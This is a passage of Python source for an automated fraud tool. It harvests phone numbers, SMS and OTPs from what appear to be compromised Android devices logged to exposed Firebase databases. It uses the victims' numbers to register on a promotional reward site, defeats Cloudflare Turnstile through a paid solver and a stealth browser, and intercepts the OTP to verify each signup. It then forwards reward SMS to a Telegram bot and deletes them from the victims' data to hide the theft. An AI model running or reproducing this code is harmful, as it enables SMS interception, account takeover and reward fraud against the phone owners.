        u = parse_firebase_url(line)
        if u:
            results.add(u)

    return sorted(list(results))

PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r'(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})', re.I), 15),
    (re.compile(r'\b(?:\+91|91)?([6-9]\d{9})\b'), 10),
    (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
]
ONLINE_STATUS_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE_VALUES = {"true", "1", "online", "connected", "active", "yes"}
SMS_SUBPATHS = [
    "messages", "sms", "inbox", "Sms", "SMS", "allSms", "smsData",
    "receivedSms", "smsList", "notifications", "data", "otp",
    "callLogs", "calls"
]

def _is_online(dev):
    for field in ONLINE_STATUS_FIELDS:
        raw = dev.get(field)
        if raw is None:
            continue
        if isinstance(raw, bool):
            return raw
        if isinstance(raw, int):
            return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES:
            return True
    return False

def _clean_phone(raw):
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return None

def _phone_from_device_fields(dev):
    sims = dev.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        return p
    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile"):
        p = _clean_phone(dev.get(k))
        if p:
            return p
    return None

def _phone_from_messages(msgs):
    counts = Counter()
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or
                   msg.get("text") or msg.get("content") or "")
        for pat, score in PHONE_PATTERNS_WEIGHTED:
            for num in pat.findall(text):
                digits = re.sub(r"\D", "", num)
                if digits.startswith("91") and len(digits) == 12:
                    digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789":
                    counts[digits] += score
    return counts.most_common(1)[0][0] if counts else None

def _fetch_phone_from_firebase(session, firebase_url, cid):
    try:
        r = session.get(f"{firebase_url}messages/{cid}.json", timeout=8, verify=False)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict) and data:
                return _phone_from_messages(data)
    except Exception:
        pass
    return None

def _count_device_messages(firebase_url, device_id, session=None):
    s = session or requests.Session()
    s.verify = False
    total = 0
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f"{firebase_url}{sub}/{device_id}.json?shallow=true", timeout=4, verify=False)
            if r.status_code != 200:
                continue
            d = r.json()
            if isinstance(d, dict):
                total += len(d)
        except Exception:
            continue
    return total

def _load_firebase_root(firebase_url):
    ROOT_KEYS = [
        "clients", "devices", "users", "Clients", "Devices",
        "client", "device", "phones", "mobiles"
    ]
    session = requests.Session()
    session.verify = False
    for key in ROOT_KEYS:
        try:
            r = session.get(f"{firebase_url}{key}.json", timeout=12, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                return key, data
        except Exception:
            continue
    try:
        r = session.get(f"{firebase_url}.json?shallow=true", timeout=12, verify=False)
        root_keys = r.json()
        if isinstance(root_keys, dict):
            for key in list(root_keys.keys()):
                try:
                    r2 = session.get(f"{firebase_url}{key}.json", timeout=12, verify=False)
                    data = r2.json()
                    if isinstance(data, dict) and len(data) > 0:
                        sample = next(iter(data.values()))
                        if isinstance(sample, dict):
                            return key, data
                except Exception:
                    continue
    except Exception:
        pass
    return None, None

def extract_devices(firebase_url, blocked):
    root_key, raw_data = _load_firebase_root(firebase_url)
    if not raw_data:
        return []
    online = {cid: dev for cid, dev in raw_data.items()
              if isinstance(dev, dict) and _is_online(dev)}
    if not online:
        return []

    session = requests.Session()
    session.verify = False
    result, lock, seen = [], threading.Lock(), set()

    def work(cid, dev):
        phone = _phone_from_device_fields(dev) or _fetch_phone_from_firebase(session, firebase_url, cid)
        if not phone or phone in blocked:
            return
        msg_count = _count_device_messages(firebase_url, cid, session)
        if msg_count <= MIN_FIREBASE_MSGS:
            log(f"💀 Dead number +91{phone} (msgs={msg_count} <= {MIN_FIREBASE_MSGS}) — skipped", "yellow")
            return
        with lock:
            if phone in seen:
                return
            seen.add(phone)
            result.append({
                "client_id": cid,
                "phone": phone,
                "firebase_url": firebase_url,
                "firebase_msgs": msg_count,
            })

    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = [ex.submit(work, cid, dev) for cid, dev in online.items()]
        for _ in as_completed(futs):
            pass
    return result

def get_last_msg_baseline(firebase_url, device_id):
    """
    Snapshot latest key + all existing keys before triggering OTP.
    Strictly prevents picking up any older/pre-existing OTP.
    """
    latest, active = None, None
    existing_keys = set()
    s = requests.Session()
    s.verify = False
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=25',
                      timeout=4, verify=False)
            if r.status_code != 200:
                continue
            d = r.json()
            if isinstance(d, dict) and d:
                existing_keys.update(d.keys())
                k = sorted(d.keys())[-1]
                if latest is None or k > latest:
                    latest, active = k, sub
        except Exception:
            continue
    return latest, active, existing_keys

def get_last_msg_key(firebase_url, device_id):
    latest, active, _ = get_last_msg_baseline(firebase_url, device_id)
    return latest, active

def _extract_otp_from_body(body):
    from collections import defaultdict
    bl = body.lower()
    cands = re.findall(r"\b(\d{4,6})\b", body)
    if not cands:
        return None
    scores = defaultdict(int)
    for c in cands:
        n = int(c)
        if 1900 <= n <= 2099:
            continue
        scores[c] += 1
        for kw in ("otp", "code", "verify", "verification", "pin",
                   "one time", "passcode", "password", "secret", "gold drop"):
            if kw in bl:
                scores[c] += 5
                break
        if len(c) == 6:
            scores[c] += 3
        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body):
            scores[c] -= 10
    return max(scores, key=scores.__getitem__) if scores else None

def wait_for_otp(firebase_url, device_id, last_key, timeout=None,
                 active_subpath=None, stop_event=None, phone=None,
                 baseline_keys=None, baseline_time=None, **kwargs):
    timeout = timeout or OTP_TIMEOUT
    deadline = time.time() + timeout
    fb_session = requests.Session()
    fb_session.verify = False
    baseline_keys = set(baseline_keys) if baseline_keys else set()
    poll_paths = ([active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath]
                  if active_subpath in SMS_SUBPATHS else SMS_SUBPATHS)

    while time.time() < deadline:
        if stop_event and stop_event.is_set():
            return None, None, None, None
        for sub in poll_paths:
            try:
                r = fb_session.get(
                    f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20',
                    timeout=4, verify=False
                )
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for key in sorted(msgs.keys(), reverse=True):
                    # Guard 1: Skip keys that already existed before trigger
                    if key in baseline_keys:
                        continue
                    # Guard 2: If no baseline_keys snapshot, require strictly newer key
                    if not baseline_keys and last_key and key <= last_key:
                        continue
                    msg = msgs[key]
                    body = ""
                    if isinstance(msg, dict):
                        # Guard 3: If timestamp exists, allow up to 45s clock skew before baseline
                        msg_time = msg.get("date") or msg.get("timestamp") or msg.get("time")
                        if msg_time and baseline_time:
                            try:
                                t_val = float(msg_time)
                                if t_val > 1e11:
                                    t_val /= 1000.0
                                if t_val < (baseline_time - 45):
                                    continue
                            except Exception:
                                pass
                        body = str(msg.get("body") or msg.get("message") or
                                   msg.get("text") or msg.get("content") or
                                   " ".join(str(v) for v in msg.values() if isinstance(v, str)))
                    elif isinstance(msg, str):
                        body = msg
                    if not body:
                        continue
                    otp = _extract_otp_from_body(body)
                    if otp:
                        return otp, key, sub, body
            except Exception:
                continue
        time.sleep(OTP_POLL_INTERVAL)
    return None, None, None, None

def delete_sms_safe(firebase_url, device_id, subpath, msg_key, expected_marker=None):
    if not (firebase_url and device_id and subpath and msg_key):
        return False
    try:
        r = requests.get(f"{firebase_url}{subpath}/{device_id}/{msg_key}.json", timeout=10, verify=False)
        if r.status_code != 200:
            return False
        cur = r.json()
    except Exception:
        return False
    if not isinstance(cur, dict):
        return False
    body = str(cur.get("body") or cur.get("message") or cur.get("text") or "")
    if expected_marker:
        em_lower = str(expected_marker).lower()
        if (em_lower not in body.lower()) and ("otp" not in body.lower()) and ("code" not in body.lower()):
            return False
    try:
        r = requests.delete(f"{firebase_url}{subpath}/{device_id}/{msg_key}.json", timeout=10, verify=False)
        return r.status_code in (200, 204)
    except Exception:
        return False

def _snapshot_latest_keys(firebase_url, device_id, session=None):
    s = session or requests.Session()
    s.verify = False
    snaps = {}
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1',
                      timeout=4, verify=False)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict) and d:
                    snaps[sub] = sorted(d.keys())[-1]
        except Exception:
            continue
    return snaps

def _save_bigcity_reward(record):
    with _db_lock:
        data = []
        if os.path.exists(BIGCITY_REWARDS_FILE):
            try:
                with open(BIGCITY_REWARDS_FILE, "r", encoding="utf-8") as f:
                    raw = json.load(f)
                if isinstance(raw, list):
                    data = raw
                elif isinstance(raw, dict):
                    data = raw.get("rewards", [])
            except Exception:
                data = []
        data.append(record)
        try:
            with open(BIGCITY_REWARDS_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            log(f"Error saving bigcity reward: {e}", "red")

def wait_for_reward_sms(firebase_url, device_id, baseline, phone, otp,
                        win_type="Reward", reward="", chat_id=None, notify_cb=None,
                        timeout=None, stop_event=None, **kwargs):
    deadline = time.time() + (timeout or REWARD_SMS_TIMEOUT)
    s = requests.Session()
    s.verify = False
    log(f"👀 Watching reward SMS for +91{phone} (up to {REWARD_SMS_TIMEOUT}s)", "cyan")

    while time.time() < deadline:
        for sub in SMS_SUBPATHS:
            base = baseline.get(sub)
            try:
                r = s.get(
                    f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20',
                    timeout=4, verify=False
                )
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for key in sorted(msgs.keys(), reverse=True):
                    if base and key <= base:
                        break
                    msg = msgs[key]
                    body = ""
                    if isinstance(msg, dict):
                        body = str(msg.get("body") or msg.get("message") or
                                   msg.get("text") or msg.get("content") or "")
                        if not body:
                            body = " ".join(str(v) for v in msg.values() if isinstance(v, str))
                    elif isinstance(msg, str):
                        body = msg
                    if not body:
                        continue
                    low = body.lower()
                    matched = next((h for h in REWARD_SMS_HINTS if h in low), None)
                    if not matched:
                        continue

                    record = {
                        "phone": phone,
                        "otp": otp,
                        "win_type": win_type,
                        "reward": reward,
                        "firebase_url": firebase_url,
                        "device_id": device_id,
                        "subpath": sub,
                        "msg_key": key,
                        "message": body,
                        "received_at": time.time(),
                        "received_at_iso": datetime.now().isoformat(),
                        "triggered_by": chat_id,
                        "matched_hint": matched,
                    }
                    _save_bigcity_reward(record)
                    add_log(f"💸 BigCity Reward SMS [+91{phone}]: {body[:40]}...")

                    text = (
                        f"💸 <b>BigCity Reward SMS Received!</b> 🎉\n\n"
                        f"📱 <b>Phone:</b> <code>+91{phone}</code>\n"
                        f"🔑 <b>OTP:</b> <code>{otp}</code>\n"
                        f"🎁 <b>Win:</b> {win_type} — <b>{reward}</b>\n"
                        f"🌐 <b>Panel:</b> <code>{firebase_url}</code>\n\n"
                        f"📨 <b>Full SMS:</b>\n<pre>{body}</pre>\n\n"
                        f"<i>Devloper by - @Harshitop_19</i>"
                    )
                    send_alert_bot(text, chat_id=ALERT_CHAT_ID or chat_id)
                    if notify_cb and chat_id:
                        try:
                            notify_cb(chat_id, text)
                        except TypeError:
                            notify_cb(text)

                    deleted = delete_sms_safe(firebase_url, device_id, sub, key, matched)
                    if deleted:
                        add_log(f"🗑 Reward SMS auto-deleted for +91{phone}")
                        if notify_cb and chat_id:
                            try:
                                notify_cb(chat_id, f"🗑 <b>Reward SMS auto-deleted</b> from Firebase — <code>+91{phone}</code>")
                            except TypeError:
                                notify_cb(f"🗑 <b>Reward SMS auto-deleted</b> from Firebase — <code>+91{phone}</code>")
                    else:
                        log(f"⚠ Reward SMS delete failed for +91{phone}", "red")

                    return record
            except Exception:
                continue
        time.sleep(REWARD_SMS_POLL_INTERVAL)

    log(f"⏱ Reward SMS watch timeout for +91{phone}", "yellow")
    return None

def encode_data(payload: dict, t_ms: int, data_key: str) -> str:
    l = base64.b64encode(str(t_ms).encode()).decode()
    d = base64.b64encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode()).decode()
    hk = data_key[4:18]
    h_hex = hmac.new(hk.encode(), f"{l}.{d}".encode(), hashlib.sha256).hexdigest()
    h_b64 = base64.b64encode(h_hex.encode()).decode()
    p = random.randint(1, 6)
    m = random.randint(2, 8)
    salt = "".join(random.choices(string.ascii_letters + string.digits, k=m))
    y = f"{m}{p}{h_b64[:p]}{salt}{h_b64[p:]}"
    return f"{l}.{d}.{y}"


# ============================================================================
#  SOLVERCF API & TURNSTILE SOLVER
# ============================================================================
def _captcha_keys_path(uid="default"):
    u_key = str(uid or "default").strip()
    if u_key == "default":
        return Path(CAPTCHA_KEYS_FILE)
    return _user_dir(u_key) / "captcha_keys.json"

def load_captcha_keys(uid="default"):
    with _captcha_keys_lock:
        k_path = _captcha_keys_path(uid)
        if not k_path.exists():
            return []
        try:
            with open(k_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                return [str(k).strip() for k in data if str(k).strip()]
            elif isinstance(data, dict):
                return [str(k).strip() for k in data.get("keys", []) if str(k).strip()]
        except Exception:
            return []
        return []

def save_captcha_keys(keys, uid="default"):
    with _captcha_keys_lock:
        seen = set()
        cleaned = []
        for k in keys:
            k_str = str(k).strip()
            if k_str and k_str not in seen:
                seen.add(k_str)
                cleaned.append(k_str)
        k_path = _captcha_keys_path(uid)
        try:
            k_path.parent.mkdir(parents=True, exist_ok=True)
            with open(k_path, "w", encoding="utf-8") as f:
                json.dump({"keys": cleaned}, f, indent=2)
        except Exception as e:
            log(f"Error saving captcha keys for {uid}: {e}", "red")

def add_captcha_keys(raw_input, uid="default"):
    if isinstance(raw_input, str):
        tokens = re.split(r"[\r\n,;\s]+", raw_input)
    elif isinstance(raw_input, list):
        tokens = raw_input
    else:
        tokens = [str(raw_input)]

    current = load_captcha_keys(uid=uid)
    added = 0
    for t in tokens:
        t_clean = t.strip()
        if t_clean and t_clean not in current:
            current.append(t_clean)
            added += 1
    if added > 0:
        save_captcha_keys(current, uid=uid)
    return added, len(current)

def delete_captcha_key(key_to_del, uid="default"):
    current = load_captcha_keys(uid=uid)
    new_keys = [k for k in current if k != key_to_del.strip()]
    save_captcha_keys(new_keys, uid=uid)
    return len(new_keys)

def clear_all_captcha_keys(uid="default"):
    save_captcha_keys([], uid=uid)

def get_solvercf_balance(key):
    try:
        r = requests.post(SOLVERCF_BALANCE_URL, json={"clientKey": key}, timeout=12, verify=False)
        if r.status_code == 200:
            data = r.json()
            if data.get("errorId", 0) == 0:
                bal = data.get("balance")
                if bal is not None:
                    return float(bal), None
                return 0.0, None
            return None, data.get("errorDescription") or data.get("errorCode", "Error")
        return None, f"HTTP {r.status_code}"
    except Exception as e:
        return None, str(e)

def solve_turnstile_solvercf(website_url="https://golddropgolddhamaka.com/register", website_key=DEFAULT_SITEKEY, timeout=90, uid="default"):
    keys = load_captcha_keys(uid=uid)
    if not keys:
        return None, None, "Aapki SolverCF API Key add nahi hai! Bot me 🔑 Captcha Keys se apni key add karein."

    errors = []
    for idx, key in enumerate(keys):
        masked_key = f"{key[:6]}...{key[-4:]}" if len(key) > 10 else key
        log(f"🔐 SolverCF [User {uid}]: Solving Turnstile with Key #{idx+1} ({masked_key})...", "cyan")
        add_log(f"🔐 SolverCF Key #{idx+1} ({masked_key})...", uid=uid)
        try:
            create_payload = {
                "clientKey": key,
                "task": {
                    "type": "TurnstileTask",
                    "websiteURL": website_url,
                    "websiteKey": website_key
                }
            }
            r = None
            for attempt in range(3):
                try:
                    r = requests.post(SOLVERCF_CREATE_URL, json=create_payload, timeout=20, verify=False)
                    if r.status_code == 200:
                        break
                    if r.status_code in (502, 503, 504, 429) and attempt < 2:
                        time.sleep(2 + attempt)
                        continue
                    break
                except Exception:
                    if attempt < 2:
                        time.sleep(2)
                        continue
                    raise

            if r is None or r.status_code != 200:
                code_num = r.status_code if r is not None else "ERR"
                err = f"Key #{idx+1} create HTTP {code_num}"
                log(f"⚠️ {err}", "yellow")
                errors.append(err)
                continue

            cdata = r.json()
            if cdata.get("errorId", 0) != 0:
                err_code = str(cdata.get("errorCode", ""))
                if "UNSOLVABLE" in err_code.upper():
                    try:
                        r_pool = requests.post(SOLVERCF_CREATE_URL, json={
                            "clientKey": key,
                            "task": {
                                "type": "TurnstileTaskPool",
                                "websiteURL": website_url,
                                "websiteKey": website_key
                            }
                        }, timeout=20, verify=False)
                        if r_pool.status_code == 200 and r_pool.json().get("errorId", 0) == 0:
                            cdata = r_pool.json()
                    except Exception:
                        pass

            if cdata.get("errorId", 0) != 0:
                err_code = str(cdata.get("errorCode", ""))
                err_desc = str(cdata.get("errorDescription", ""))
                err_msg = f"Key #{idx+1} ({err_code}): {err_desc}"
                log(f"⚠️ SolverCF error on key #{idx+1}: {err_msg}", "yellow")
                errors.append(err_msg)
                continue

            task_id = cdata.get("taskId")
            if not task_id:
                errors.append(f"Key #{idx+1} no taskId in response")
                continue

            short_tid = f"{str(task_id)[:10]}..."
            log(f"⏳ SolverCF Task Created ({short_tid}), waiting for token...", "cyan")
            add_log(f"⏳ SolverCF Task Created ({short_tid})...", uid=uid)

            deadline = time.time() + timeout
            while time.time() < deadline:
                time.sleep(2.5)
                try:
                    res_r = requests.post(SOLVERCF_RESULT_URL, json={"clientKey": key, "taskId": task_id}, timeout=20, verify=False)
                except Exception:
                    continue
                if res_r.status_code != 200:
                    continue
                res_data = res_r.json()
                if res_data.get("errorId", 0) != 0:
                    err_code = res_data.get("errorCode", "")
                    err_desc = res_data.get("errorDescription") or err_code
                    errors.append(f"{err_code}: {err_desc}")
                    log(f"⚠️ SolverCF task error on Key #{idx+1}: {err_code}: {err_desc}", "yellow")
                    break

                status = str(res_data.get("status") or "").lower().strip()
                sol = res_data.get("solution") if isinstance(res_data.get("solution"), dict) else {}
                token = (
                    sol.get("token")
                    or sol.get("cfTurnstileResponse")
                    or sol.get("gRecaptchaResponse")
                    or res_data.get("token")
                )
                if token:
                    log(f"✅ SolverCF: Turnstile Solved with Key #{idx+1}!", "green")
                    add_log(f"✅ SolverCF Solved Key #{idx+1}!", uid=uid)
                    return token, key, None

                if status in ("ready", "completed", "solved", "success"):
                    errors.append(f"Status {status} but token empty: {str(res_data)[:120]}")
                    break
                elif status in ("processing", "pending", "created", "in_progress", "queued", "running", ""):
                    continue
                else:
                    errors.append(f"Unknown status: {status}")
                    break
        except Exception as e:
            errors.append(f"Key #{idx+1} exception: {e}")
            log(f"⚠️ SolverCF Exception on Key #{idx+1}: {e}", "yellow")
            continue

    all_err = " | ".join(errors) if errors else "All captcha keys failed"
    return None, None, all_err

def make_session(master_key):
    s = requests.Session()
    s.cookies.set("gold-drop-id", master_key, domain="golddropgolddhamaka.com")
    s.headers.update({
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache", "pragma": "no-cache",
        "origin": BASE_URL, "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "referer": f"{BASE_URL}/",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    })
    return s

def step_init(s, master_key, pincode):
    r = s.post(f"{BASE_URL}/api/users", json={
        "masterKey": master_key,
        "ipInfo": {"status": "success", "country": "India", "countryCode": "IN",
                   "region": "TS", "regionName": "Telangana", "city": "Hyderabad",
                   "zip": pincode, "lat": 17.385, "lon": 78.4867,
                   "timezone": "Asia/Kolkata", "isp": "Jio", "org": "Reliance Jio",
                   "as": "AS55836", "query": "1.1.1.1"}},
        headers={"content-type": "application/json", "referer": f"{BASE_URL}/"})
    uk = dk = None
    try:
        resp = r.json()
        if "resp" in resp:
            inner = json.loads(base64.b64decode(resp["resp"]).decode())
            uk = str(inner.get("userKey", ""))
            dk = inner.get("dataKey", "")
    except Exception:
        pass
    return r, uk, dk

def step_get_start(s, uk):
    return s.post(f"{BASE_URL}/api/users/get-start/{uk}",
                  headers={"content-type": "application/json", "referer": f"{BASE_URL}/"})

def step_register(s, uk, dk, name, mobile, email, pincode, img_payload, captcha_token="", code=BATCH_CODE):
    t = int(time.time() * 1000)
    payload = {
        "name": name, "mobile": mobile, "email": email, "pincode": pincode,
        "code": code, "terms_accepted": "1", "userKey": uk,
        "token": captcha_token,  # Solved Turnstile response token from SolverCF
        "t": str(t)
    }
    enc = encode_data(payload, t, dk)

    img_buffer = None
    if isinstance(img_payload, dict):
        img_buffer = img_payload.get("buffer")
    elif isinstance(img_payload, bytes):
        img_buffer = img_payload
    elif isinstance(img_payload, str):
        try:
            img_buffer = base64.b64decode(clean_base64(img_payload))
        except Exception:
            img_buffer = None

    if not img_buffer:
        img_buffer = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' \",#\x1c\x1c(7),01444\x1f\'9=82<.342\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xbf\x00\xff\xd9"

    files = {
        "data": (None, enc),
        "img": ("photo.jpg", img_buffer, "image/jpeg")
    }
    headers = {
        "accept": "*/*",
        "referer": f"{BASE_URL}/register",
        "origin": BASE_URL,
    }
    return s.post(
        f"{BASE_URL}/api/users/register/{uk}?t={t}",
        files=files,
        headers=headers,
        timeout=25,
        verify=False
    )

# ================= BROWSER AUTOMATION & CAPTCHA SOLVER =================

def run_browser_automation(name, phone, email, img_payload):
    """
    Drives Chromium in Mobile Emulation mode (bypasses PC desktop block).
    Uploads batch code image via in-memory buffer (Base64) or file path.
    Waits for Cloudflare Turnstile Captcha auto-solve / user completion.
    Submits registration form which triggers OTP to the phone.
    Returns (user_key, data_key, error_message).
    """
    try:
        from patchright.sync_api import sync_playwright
    except ImportError:
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            return None, None, "Neither patchright nor playwright installed. Run: pip install patchright"

    captured = {}

    def on_response(resp):
        try:
            if "/api/users" not in resp.url:
                return
            body = resp.text()
            key = resp.url.split("/api/users")[-1].split("?")[0] or "/"
            try:
                inner = json.loads(base64.b64decode(json.loads(body)["resp"]).decode())
            except Exception:
                inner = {"raw": body[:120]}
            captured[key] = (resp.status, inner, body)
            log(f"[XHR] {key or '/'} -> status={resp.status} {inner}", "cyan")
        except Exception:
            pass

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=HEADLESS,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled"
            ]
        )

        mobile_device = {
            "user_agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
            "viewport": {"width": 393, "height": 852},
            "device_scale_factor": 2.75,
            "is_mobile": True,
            "has_touch": True,
        }
        ctx = browser.new_context(**mobile_device)
        page = ctx.new_page()
        page.on("response", on_response)

        try:
            # 1. Open Website in Mobile View
            page.goto(f"{BASE_URL}/", wait_until="commit", timeout=45000)
            page.wait_for_timeout(4000)

            # 2. Click Get Started button
            get_started_btn = page.get_by_role("button", name="Get Started")
            if get_started_btn.is_visible(timeout=10000):
                get_started_btn.click()
            else:
                page.locator("button:has-text('Get Started'), a:has-text('Get Started')").first.click(timeout=10000)

            page.wait_for_timeout(3000)

            # 3. Fill Form Fields
            page.fill("[name='name']", name)
            page.fill("[name='mobile']", phone)
            page.fill("[name='email']", email)
            page.fill("[name='pincode']", PINCODE)
            page.fill("[name='batchCode']", BATCH_CODE)

            # 4. Attach Image (Direct Base64 buffer OR file path)
            if img_payload["type"] == "buffer":
                page.set_input_files("[name='batchCodeImage']", files=[{
                    "name": img_payload.get("name", "batch.jpg"),
                    "mimeType": img_payload.get("mimeType", "image/jpeg"),
                    "buffer": img_payload["buffer"]
                }])
            else:
                page.set_input_files("[name='batchCodeImage']", str(img_payload["path"]))

            # 5. Agree Checkbox
            page.locator("label[for='agree1'], input#agree1").first.click(timeout=6000)

            # 6. Wait for Cloudflare Turnstile Captcha auto-solve
            log("[Turnstile] Browser open: Waiting for captcha solve...", "yellow")
            for _ in range(40):
                page.wait_for_timeout(1000)
                try:
                    val = page.input_value("[name='cf-turnstile-response']")
                    if val:
                        log(f"[Turnstile] Solved: token length = {len(val)}", "green")
                        break
                except Exception:
                    pass

            # 7. Submit Form
            submit_btn = page.locator("button[type='submit']").first
            submit_btn.click()
            page.wait_for_timeout(8000)

        finally:
            browser.close()

    init_inner = captured.get("/", (({}, {}),))[1] if "/" in captured else {}
    register_res = captured.get("/register", (({}, {}),))[1] if "/register" in captured else {}

    user_key = init_inner.get("userKey")
    data_key = init_inner.get("dataKey")

    if not user_key:
        error_msg = register_res.get("message") or "Registration failed / Turnstile not verified"
        return None, None, error_msg

    return str(user_key), str(data_key), None


def decode_resp(text):
    """Decode outer base64 response into inner dict."""
    try:
        outer = json.loads(text)
        return json.loads(base64.b64decode(outer["resp"]).decode("utf-8"))
    except Exception as e:
        return {"statusCode": -1, "message": f"decode error: {e}"}


def http_verify(user_key, data_key, otp):
    """Verify OTP via direct HTTPS POST with mobile user-agent."""
    import urllib.request, urllib.error
    t = int(time.time() * 1000)
    payload = {"otp": str(otp), "userKey": str(user_key), "t": str(t)}
    req = urllib.request.Request(
        f"{BASE_URL}/api/users/verify-otp/{user_key}?t={t}",
        data=json.dumps({"data": encode_data(payload, t, data_key)}).encode(),
        headers={
            "content-type": "application/json",
            "referer": f"{BASE_URL}/otp",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
        },
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return decode_resp(r.read().decode("utf-8", "ignore"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(base64.b64decode(json.loads(e.read().decode())["resp"]).decode())
        except Exception:
            return {"statusCode": e.code, "message": "HTTP error"}
    except Exception as e:
        return {"statusCode": -1, "message": str(e)[:80]}

def step_verify_otp(s, uk, dk, otp):
    t = int(time.time() * 1000)
    enc = encode_data({"otp": otp, "userKey": uk, "t": str(t)}, t, dk)
    return s.post(
        f"{BASE_URL}/api/users/verify-otp/{uk}?t={t}",
        json={"data": enc},
        headers={"content-type": "application/json", "referer": f"{BASE_URL}/otp"}
    )

def process_single_device(phone, fb_url, client_id, chat_id, stop_event, notify_cb, uid=None):
    def notify(text):
        if notify_cb:
            try:
                notify_cb(chat_id, text)
            except TypeError:
                notify_cb(text)

    u_key = str(uid or chat_id or "default")
    u_runner = get_user_runner(u_key)

    if stop_event.is_set():
        return {"phone": phone, "status": "stopped"}
    if should_skip_phone(phone, uid=u_key):
        return {"phone": phone, "status": "skipped"}

    ok_pts, cur_pts = has_sufficient_points(u_key)
    if not ok_pts:
        log(f"User {u_key} has 0 points — stopping scan.", "yellow")
        notify("⚠️ <b>Points Khatam Ho Gaye!</b> (0 pts)\n1 OTP Verified = -1 Point. Scan roka ja raha hai — Refer karke points earn karein.")
        stop_event.set()
        return {"phone": phone, "status": "insufficient_points"}

    img_payload = get_active_image_payload(uid=u_key)
    if not img_payload:
        log(f"No valid batch image found for user {u_key}!", "red")
        notify("⚠️ <b>Image Missing:</b> Kripya chat me photo send karein ya base64 paste karein!")
        return {"phone": phone, "status": "missing_image"}

    cap_keys = load_captcha_keys(uid=u_key)
    if not cap_keys:
        log(f"No SolverCF API key found for user {u_key}!", "red")
        notify("⚠️ <b>Aapki Captcha Key Missing:</b> Bot me 🔑 <b>Captcha Keys</b> se apni SolverCF API Key add karein!")
        return {"phone": phone, "status": "missing_captcha_key"}

    baseline_time = time.time()
    last_key, active_sub, baseline_keys = get_last_msg_baseline(fb_url, client_id)

    name, email = generate_random_identity()

    u_runner.current_step = f"Solving Captcha via SolverCF for +91{phone}..."
    runner_status.current_step = u_runner.current_step
    log(f"🔐 Solving Turnstile Captcha via SolverCF for +91{phone}...", "cyan")

    c_token, used_key, c_err = solve_turnstile_solvercf(uid=u_key)
    if c_err or not c_token:
        err_msg = c_err or "Captcha solve failed"
        log(f"❌ Captcha Solve Failed for +91{phone}: {err_msg}", "red")
        save_processed(phone, f"captcha_failed: {err_msg[:40]}", panel_url=fb_url, uid=u_key)
        hint = "<i>Kripya SolverCF API key aur balance check karein.</i>"
        if "user not found" in err_msg.lower():
